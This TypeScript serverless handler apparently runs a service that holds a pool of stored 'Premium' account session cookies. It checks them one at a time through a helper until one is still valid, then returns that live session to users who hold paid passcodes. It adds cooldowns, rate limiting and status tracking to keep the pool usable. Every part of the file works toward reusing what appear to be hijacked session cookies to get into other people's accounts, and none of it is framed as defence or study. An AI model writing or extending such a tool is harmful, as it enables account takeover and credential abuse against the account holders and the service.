// api/find-account.ts – RELENTLESS SCANNER
// ✅ Checks EVERY available cookie until it finds a valid one
// ✅ 10-minute cooldown per cookie
// ✅ Rechecks 'unknown' status cookies
// ✅ No schema changes

import type { VercelRequest, VercelResponse } from "@vercel/node";
import { ipRateLimit } from "../lib/rateLimit.js";
import {
  isLockedOut,
  recordFailure,
  clearFailures,
} from "../lib/antiBruteforce.js";
import { createClient } from "@supabase/supabase-js";
import { createRequire } from "module";

const supabase = createClient(
  process.env.SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!,
  {
    auth: {
      persistSession: false,
      autoRefreshToken: false,
    },
  }
);

const require = createRequire(import.meta.url);
const originalServerHelpers = require("./original_server_helpers.cjs");

const { getCookieHeaders, runDirectCheck } =
  originalServerHelpers.default ?? originalServerHelpers;

// ============ IN-MEMORY COOLDOWN TRACKING ============
// ✅ NO DATABASE CHANGES – everything stays in memory
const recentlyChecked = new Map<string, number>(); // cookie_id -> timestamp
const COOLDOWN_MS = 10 * 60 * 1000; // 10 minutes

// Cleanup old entries every 5 minutes
setInterval(() => {
  const now = Date.now();
  let removed = 0;
  for (const [id, timestamp] of recentlyChecked) {
    if (now - timestamp > COOLDOWN_MS) {
      recentlyChecked.delete(id);
      removed++;
    }
  }
  if (removed > 0) {
    console.log(`🧹 Cleaned up ${removed} expired cooldown entries`);
  }
}, 5 * 60 * 1000);

// ============ UTILITY FUNCTIONS ============

function getClientIp(req: VercelRequest) {
  const xff = req.headers["x-forwarded-for"];
  if (typeof xff === "string" && xff.length > 0) {
    return xff.split(",")[0].trim();
  }
  const realIp = req.headers["x-real-ip"];
  if (typeof realIp === "string" && realIp.length > 0) {
    return realIp.trim();
  }
  return "unknown";
}

function getAccessToken(req: VercelRequest) {
  const authorization = req.headers.authorization;
  const headerValue = Array.isArray(authorization)
    ? authorization[0]
    : authorization || "";
  const match = headerValue.match(/^Bearer\s+(.+)$/i);
  return match?.[1]?.trim() || "";
}

// ============ PASSCODE VALIDATION ============

type PasscodeCheck =
  | {
      ok: true;
      passcodeRow: {
        id: string;
        uses: number | null;
      };
    }
  | {
      ok: false;
      error: string;
    };

async function isPasscodeValid(
  passcode: string,
  userId: string
): Promise<PasscodeCheck> {
  const { data, error } = await supabase
    .from("passcodes")
    .select("id, code, user_id, is_active, expires_at, uses, max_uses")
    .eq("code", passcode)
    .eq("user_id", userId)
    .eq("is_active", true)
    .maybeSingle();

  if (error) {
    console.error("Passcode lookup error:", error);
    throw new Error("Unable to verify the premium code.");
  }

  if (!data) {
    return { ok: false, error: "Incorrect passcode." };
  }

  if (data.expires_at && new Date(data.expires_at) <= new Date()) {
    return { ok: false, error: "This passcode has expired." };
  }

  if (
    typeof data.max_uses === "number" &&
    typeof data.uses === "number" &&
    data.uses >= data.max_uses
  ) {
    return { ok: false, error: "Usage limit reached." };
  }

  return {
    ok: true,
    passcodeRow: { id: data.id, uses: data.uses ?? 0 },
  };
}

async function incrementPasscodeUsage(
  passcodeId: string,
  currentUses: number | null
) {
  const { error } = await supabase
    .from("passcodes")
    .update({ uses: (currentUses ?? 0) + 1 })
    .eq("id", passcodeId);
  if (error) {
    console.error("incrementPasscodeUsage error:", error.message);
  }
}

// ============ DATABASE FUNCTIONS ============

async function savePassedCheckAudits(results: any[]) {
  const passed = (results || []).filter((result) => result?.valid);
  if (!passed.length) return;

  const rows = passed.map((item) => ({
    plan: item.plan || null,
    country: item.countryOfSignup || null,
    checked_at: new Date().toISOString(),
  }));

  const { error } = await supabase.from("live_checks").insert(rows);
  if (error) {
    console.error("savePassedCheckAudits error:", error.message);
  }
}

// ✅ Only mark as 'expired' on definitive failures, keep 'unknown' for retry
async function updateCookieStatus(
  cookieId: string,
  isValid: boolean,
  plan?: string,
  country?: string,
  isNetworkError: boolean = false
) {
  const updateData: any = {
    checked_at: new Date().toISOString(),
  };

  if (isValid) {
    updateData.status = "active";
    if (plan) updateData.plan = plan;
    if (country) updateData.country = country;
  } else {
    // ✅ KEEP UNKNOWN – will be retried
    if (isNetworkError) {
      updateData.status = "unknown";
    } else {
      updateData.status = "expired";
    }
  }

  const { error } = await supabase
    .from("checked_cookies")
    .update(updateData)
    .eq("id", cookieId);

  if (error) {
    console.error(`Failed to update cookie ${cookieId}:`, error.message);
  }
}

// ============ MAIN HANDLER ============

export default async function handler(
  req: VercelRequest,
  res: VercelResponse
) {
  const startTime = Date.now();
  console.log("🚀 find-account API called");

  try {
    // 1. METHOD CHECK
    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        error: "Method not allowed",
      });
    }

    // 2. IP RATE LIMITING
    const ip = getClientIp(req);
    console.log(`📡 Request from IP: ${ip}`);

    const { success: rateLimitSuccess } = await ipRateLimit.limit(ip);
    if (!rateLimitSuccess) {
      return res.status(429).json({
        success: false,
        error: "Too many requests. Please slow down.",
      });
    }

    if (await isLockedOut(ip)) {
      return res.status(429).json({
        success: false,
        error: "Too many failed attempts. Try again later.",
      });
    }

    // 3. AUTH CHECK
    const accessToken = getAccessToken(req);
    if (!accessToken) {
      return res.status(401).json({
        success: false,
        error: "You must be logged in.",
      });
    }

    const {
      data: { user },
      error: userError,
    } = await supabase.auth.getUser(accessToken);

    if (userError || !user) {
      return res.status(401).json({
        success: false,
        error: "Invalid or expired login session.",
      });
    }
    console.log(`👤 User authenticated: ${user.email}`);

    // 4. PASSCODE CHECK
    const passcode = String(req.body?.passcode ?? "").trim();
    if (!passcode) {
      await recordFailure(ip);
      return res.status(400).json({
        success: false,
        error: "Passcode is required.",
      });
    }

    const passcodeCheck = await isPasscodeValid(passcode, user.id);
    if (!passcodeCheck.ok) {
      await recordFailure(ip);
      return res.status(401).json({
        success: false,
        error: passcodeCheck.error,
      });
    }
    console.log("✅ Passcode validated");

    // 5. FETCH ALL AVAILABLE PREMIUM COOKIES
    console.log("🔍 Fetching ALL available Premium cookies...");

    const { data: allCookies, error: cookieError } = await supabase
      .from("checked_cookies")
      .select("id, cookie_header, plan, country, status")
      .eq("plan", "Premium")
      .or('status.eq.unknown,status.is.null,status.eq.active,status.eq.') // Include unknown and null
      .not("cookie_header", "is", null)
      .not("cookie_header", "eq", "");

    if (cookieError) {
      console.error("❌ Cookie pool lookup error:", cookieError);
      return res.status(500).json({
        success: false,
        error: "Unable to load the available account pool.",
        details: cookieError.message,
      });
    }

    console.log(`✅ Found ${allCookies?.length || 0} total Premium cookies`);

    if (!allCookies || allCookies.length === 0) {
      return res.status(404).json({
        success: false,
        error: "No Premium cookies available in the pool.",
        debug: {
          totalCookies: 0,
        },
      });
    }

    // 6. FILTER OUT COOKIES IN COOLDOWN AND SHUFFLE
    const now = Date.now();
    const availableCookies = allCookies.filter((row: any) => {
      const lastChecked = recentlyChecked.get(row.id);
      if (lastChecked) {
        const timeSince = now - lastChecked;
        if (timeSince < COOLDOWN_MS) {
          console.log(`⏳ Skipping cookie ${row.id} - in cooldown (${Math.round(timeSince / 1000)}s ago)`);
          return false;
        }
      }
      return true;
    });

    console.log(`✅ Available cookies (not in cooldown): ${availableCookies.length}`);

    if (availableCookies.length === 0) {
      return res.status(404).json({
        success: false,
        error: "All Premium cookies are in cooldown. Please wait 10 minutes.",
        debug: {
          cooldownMinutes: 10,
          totalCookies: allCookies.length,
          nextAvailableIn: "10 minutes",
        },
      });
    }

    // 7. SHUFFLE FOR TRUE RANDOMNESS
    console.log("🔀 Shuffling cookies for random order...");
    for (let i = availableCookies.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [availableCookies[i], availableCookies[j]] = [availableCookies[j], availableCookies[i]];
    }

    console.log(`🎯 Will check ALL ${availableCookies.length} cookies until valid one is found`);

    // 8. CHECK COOKIES ONE BY ONE – UNTIL VALID FOUND
    let checkedCount = 0;

    for (const item of availableCookies) {
      checkedCount++;
      console.log(`🔍 Checking cookie ${checkedCount}/${availableCookies.length} (ID: ${item.id})`);

      // Mark as checked for cooldown
      recentlyChecked.set(item.id, now);

      try {
        const cookieArray = [item.cookie_header];

        const result = await runDirectCheck(cookieArray, 1, {
          skipNFToken: false,
          delayMs: 0,
          randomJitter: false,
          staggerMs: 0,
          onValidCookie: async () => {},
        });

        const results = Array.isArray(result?.results) ? result.results : [];
        const valid = results.find((r: any) => r?.valid);

        // Update database status
        await updateCookieStatus(
          item.id,
          !!valid,
          valid?.plan || item.plan || "Premium",
          valid?.countryOfSignup || item.country || null,
          false // No network error
        );

        if (valid) {
          await savePassedCheckAudits(results);
          console.log(`✅✅✅ VALID Premium cookie FOUND after checking ${checkedCount} cookies!`);
          await incrementPasscodeUsage(
            passcodeCheck.passcodeRow.id,
            passcodeCheck.passcodeRow.uses
          );
          await clearFailures(ip);

          const responseTime = Date.now() - startTime;
          console.log(`⏱️ Response time: ${responseTime}ms`);

          return res.status(200).json({
            success: true,
            ...result,
            debug: {
              totalCookiesChecked: checkedCount,
              totalAvailable: availableCookies.length,
              responseTime: `${responseTime}ms`,
              cookieId: item.id,
            },
          });
        } else {
          console.log(`❌ Cookie ${checkedCount} invalid or expired`);
        }
      } catch (checkError: any) {
        console.error(`⚠️ Error checking cookie ${item.id}:`, checkError.message);
        // ✅ Keep as unknown on network errors
        await updateCookieStatus(
          item.id,
          false,
          item.plan || "Premium",
          item.country || null,
          true // Network error – keep as unknown
        );
      }
    }

    // 9. NO VALID COOKIES FOUND – Checked ALL available cookies
    console.log(`❌❌❌ NO valid Premium cookies found after checking ALL ${checkedCount} available cookies`);

    return res.status(404).json({
      success: false,
      error: "No valid Premium accounts found. All checked cookies are expired or invalid.",
      debug: {
        totalChecked: checkedCount,
        totalAvailable: availableCookies.length,
        totalInPool: allCookies.length,
        cooldownMinutes: 10,
        message: "All available cookies have been checked. Please try again later.",
      },
    });
  } catch (error: any) {
    console.error("💥 find-account crash:", error);
    return res.status(500).json({
      success: false,
      error: error?.message || "Unexpected server error",
      debug: process.env.NODE_ENV === "development" ? { stack: error?.stack } : undefined,
    });
  }
}
